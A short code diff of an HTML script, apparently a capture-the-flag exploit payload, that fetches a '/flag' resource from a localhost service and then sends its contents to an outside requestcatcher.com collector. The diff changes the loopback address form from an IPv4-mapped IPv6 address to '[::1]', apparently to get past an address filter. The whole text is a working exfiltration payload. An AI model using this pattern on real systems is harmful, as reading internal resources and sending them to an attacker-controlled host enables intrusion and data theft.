@@ -1,7 +1,7 @@
 <script>
   async function displayFileContentsAsync() {
   try {
-    const response = await fetch('https://[::ffff:127.0.0.1]:3000/flag');
+    const response = await fetch('https://[::1]:3000/flag');
     const text = await response.text();
     console.log(text);
 		const resp = await fetch(`https://tolololo.requestcatcher.com/${text}`)
